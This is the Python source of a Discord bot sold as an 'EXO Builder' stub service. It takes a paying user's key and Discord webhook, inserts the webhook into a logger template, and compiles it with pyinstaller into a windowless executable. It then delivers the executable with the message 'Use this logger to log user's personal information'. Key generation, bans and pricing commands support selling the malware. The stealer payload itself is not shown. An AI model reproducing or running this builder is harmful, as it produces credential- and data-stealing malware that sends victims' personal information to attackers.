import discord
import random
import string
import shutil
import os
import subprocess
import requests
import uuid
import asyncio
import concurrent.futures

from pystyle import *
from pystyle import Colors, Colorate
from discord.ext import commands

intents = discord.Intents.all()

config = {
   'token': "YourBotToken",  # BOT TOKEN
   'authid': "yourdiscordid", # ADMIN ID PERSON WHO CAN GENNERATE KEYS [CAN ONLY BE 1 ID]
   'name': "EXO", # NAME OF BOT for example since its EXO its going to say "EXO Builder"
   'embedcolor': "0x702963" # the color code has to have 0x infront of the hex code always
}

# 0xFFFF00 <- yellow
# 0x702963 <- purple

os.system('cls')
os.system('title Stub Builder Bot [github.com/syntheticlol]')
banner = """

         [Developer = synthetic#1337]
                          
                Prefix = [+]

  ╔══════════════════════════════════════╗ 
  ║         |Loaded Commands <3|         ║
  ║                                      ║
  ║ -------------------------------------║
  ║             Client Commands          ║
  ║ -------------------------------------║
  ║                 +help                ║
  ║               +features              ║
  ║                +about                ║
  ║               +prices                ║
  ║                +build                ║
  ║ -------------------------------------║
  ║             Admin Commands           ║
  ║ -------------------------------------║
  ║               +genkey                ║
  ║              +Blacklist              ║
  ║                +ban                  ║
  ║               +unban                 ║
  ║ -------------------------------------║
  ╚══════════════════════════════════════╝  

"""

print(Colorate.Horizontal(Colors.red_to_purple, Center.XCenter(banner)))
bot = commands.Bot(command_prefix='+', intents=intents, help_command=None)

def black():
    try:
        with open("blacklist.txt", "r") as f:
            lines = filter(None, f.read().splitlines())
            return set(map(int, lines))
    except FileNotFoundError:
        return set()

blacklist = black()

@bot.command(name='ban')
async def banu(ctx, user_id: int):
    authed = config['authid']
    if ctx.message.author.id != int(authed):
        await ctx.send("Who do you think you are, bro?")
        return
    if user_id in blacklist:
        await ctx.send("This user is already banned. Lmao, L bozo.")
        return
    with open("blacklist.txt", "a") as f:
        f.write(str(user_id) + "\n")
        blacklist.add(user_id)
    await ctx.send(f"{user_id} has been banned.")

@bot.command(name='unban')
async def unbanu(ctx, user_id: int):
    authed = config['authid']
    if ctx.message.author.id != int(authed):
        await ctx.send("Who you think you are bro")
        return

    if user_id not in blacklist:
        await ctx.send("This dude aint banned")
        return

    with open("blacklist.txt", "r") as f:
        lines = f.readlines()
    with open("blacklist.txt", "w") as f:
        for line in lines:
            if str(user_id) not in line.strip():
                f.write(line)

    blacklist.remove(user_id)
    await ctx.send(f"{user_id} has been unbanned")


@bot.command(name='help')
async def lolhelpdude(ctx):
    if ctx.message.author.id in blacklist:
        embed=discord.Embed(title=f"{config['name']}", description="Synthetic is Daddy fr :3", color=0x702963)
        embed.add_field(
            name=f"{config['name']} Info",
            value="""```
===================================>

      You Are Banned From Bot

===================================>
```""",
        )
    else:
        embed = discord.Embed(title=f"{config['name']} Builder", description="Synthetic is Daddy fr :3", color=int(config['embedcolor'], 16))
        embed.add_field(
            name="Help : All Commands",
            value=f"""
        **===================== Client Commands =====================**

        **+features**```Command to show all {config['name']} features```
        **+info**```Info (who developer is and bot prefix)```
        **+about**```About us```
        **+price**```Prices for {config['name']}```
        **+build <webhook> <key>**```Command to build stub```

        **===================== Admin Commands =======================**

        **+genkey <userid>**```Command to attribute a key to user```
        **+blacklist <userid>**```Command to blacklist a key```
        **+ban <userid>**```Ban a user```
        **+unban <userid>**```Unban a user```

        """,
        )

    await ctx.send(embed=embed)

@bot.command(name='features')
async def sfeatures(ctx):
    if ctx.message.author.id in blacklist:
        embed=discord.Embed(title=f"{config['name']} Builder", description="Synthetic is Daddy fr :3", color=0x702963)
        embed.add_field(
            name=f"{config['name']} Info",
            value="""```
===================================>

      You Are Banned From Bot

===================================>
```""",
        )
    else:
    # Create an embed message
        embed=discord.Embed(title=f"{config['name']} Builder", description="Synthetic is Daddy fr :3", color=0x702963)
        embed.add_field(
            name=f"{config['name']} Features",
            value="""```

CUSTOMIZE THIS

```""",
        )

    await ctx.send(embed=embed)

@bot.command(name='about')
async def abu(ctx):
    if ctx.message.author.id in blacklist:
        embed=discord.Embed(title=f"{config['name']} Builder", description="Synthetic is Daddy fr :3", color=0x702963)
        embed.add_field(
            name=f"{config['name']} Info",
            value="""```
===================================>

      You Are Banned From Bot

===================================>
```""",
        )
    else:
    # Create an embed message
        embed=discord.Embed(title=f"{config['name']} Builder", description="Synthetic is Daddy fr :3", color=0x702963)
        embed.add_field(
            name=f"{config['name']} Info",
            value="""```
============= ABOUT US ===========>

               DESC 

===================================>
```""",
        )

    await ctx.send(embed=embed)

@bot.command(name='info')
async def inf(ctx):
    if ctx.message.author.id in blacklist:
        embed=discord.Embed(title=f"{config['name']} Builder", description="Synthetic is Daddy fr :3", color=0x702963)
        embed.add_field(
            name=f"{config['name']} Info",
            value="""```
===================================>

      You Are Banned From Bot

===================================>
```""",
        )
    else:
    # Create an embed message
        embed=discord.Embed(title=f"{config['name']} Builder", description="Synthetic is Daddy fr :3", color=0x702963)
        embed.add_field(
            name=f"{config['name']} Info",
            value="""```
============= Developer ==========>

       Bot By synthetic#1337  

============== Prefix ============>

            Prefix [+]

===================================>
```""",
        )

    await ctx.send(embed=embed)

@bot.command(name='price')
async def ss(ctx):
    if ctx.message.author.id in blacklist:
        embed=discord.Embed(title=f"{config['name']} Builder", description="Synthetic is Daddy fr :3", color=0x702963)
        embed.add_field(
            name=f"{config['name']} Info",
            value="""```
===================================>

      You Are Banned From Bot

===================================>
```""",
        )
    else:
    # Create an embed message
        embed=discord.Embed(title=f"{config['name']} Builder", description="Synthetic is Daddy fr :3", color=0x702963)
        embed.add_field(
            name=f"{config['name']} Info",
            value="""```
============== PRICES =============>

         Your Prices here

===================================>
```""",
        )

    await ctx.send(embed=embed)

def generatek():
    return "".join(
        random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
        for _ in range(10)
    )

@bot.command(name='genkey')
async def genkeyy(ctx, user_id: str):
    authed = config['authid']
    if ctx.message.author.id != int(authed):
        await ctx.send("Who do you think you are bro")
        return

    key = generatek()
    with open("KEYS.txt", "a") as file:
        file.write(f"{user_id}:KEY-{key}\n")

    user = await bot.fetch_user(int(user_id))
    await user.send(f"This is your key for {config['name']}: `KEY-{key}`")
    embed = discord.Embed(title="{config['name']} Builder", description="Synthetic is Daddy fr :3", color=0x702963)
    embed.add_field(name=f"{config['name']}", value=f"```User was successfully added. Key: KEY-{key}```")
    await ctx.send(embed=embed)


@bot.command(name='blacklist')
async def blacklistk(ctx, userid: str):
    authed = config['authid']
    if ctx.message.author.id != int(authed):
        await ctx.send("Who do you think you are bro")
        return

    with open("KEYS.txt", "r") as f:
        lines = f.readlines()

    with open("KEYS.txt", "w") as f:
        for line in lines:
            if not line.startswith(f"{userid}:"):
                f.write(line)

    embed = discord.Embed(title=f"{config['name']} Builder", description="Synthetic is Daddy fr :3", color=0x702963)
    embed.add_field(name=f"{config['name']}", value=f"```{userid}'s key has been revoked```")
    await ctx.send(embed=embed)

CEE = concurrent.futures.ThreadPoolExecutor(max_workers=100)

@bot.command(name='build')
async def buildstub(ctx, webhook: str, key: str = "default"):
    if ctx.message.author.id in blacklist:
        embed = discord.Embed(title=f"{config['name']} Builder", description="Synthetic is Daddy fr :3", color=0x702963)
        embed.add_field(name=f"{config['name']} Info", value="""```
===================================>
      
      You Are Banned From Bot
      
===================================>
```""")
        await ctx.send(embed=embed)
    else:
        with open("KEYS.txt", "r") as f:
            keys = [line.strip().split(":") for line in f.readlines()]
        valid_key = [str(ctx.author.id), key] in keys
        if not valid_key:
            await ctx.send("Sorry, that's not your key silly :smiling_face_with_3_hearts: :scream: :heart_eyes: :stuck_out_tongue: :money_mouth:")
            return

        loop = asyncio.get_event_loop()
        await loop.run_in_executor(CEE, casw, ctx, webhook)
    
def casw(ctx, webhook):
    try:
        UI = str(uuid.uuid4())
        sf = f"Logger_{UI}.py"
        ef = f"Logger_{UI}.exe"
        
        shutil.copyfile("Source.py", sf)
        with open(sf, "r+", encoding="utf-8") as f:
            content = f.read()
            f.seek(0, 0)
            webhook_url = webhook
            content = content.replace('%webhook%', webhook)
            f.write(content)
        
        embed = discord.Embed(title=f"{config['name']} Builder", description="Synthetic is Daddy fr :3", color=0x702963)
        embed.add_field(name=f"{config['name']} Builder", value="```Your Logger Is Getting Compiled.```")
        message = asyncio.run_coroutine_threadsafe(ctx.send(embed=embed), bot.loop).result()
        
        subprocess.run(f"pyinstaller --onefile --noconsole {sf}", shell=True, check=True)
        
        with open(f"dist/{ef}", "rb") as f:
            file = discord.File(f, filename=ef)
            asyncio.run_coroutine_threadsafe(ctx.send(file=file), bot.loop).result()
        embed = discord.Embed(title=f"{config['name']} Builder", description="Synthetic is Daddy fr :3", color=0x702963)
        embed.add_field(name="Stub Created", value="```>> Your Logger is Compiled !\n>> Use this logger to log user's personal information```", inline=False)
        asyncio.run_coroutine_threadsafe(message.edit(embed=embed), bot.loop).result()
        
        os.remove(sf)
        shutil.rmtree("build")
    except Exception as e:
        print(f"{str(e)}")



bot.run(config['token'])
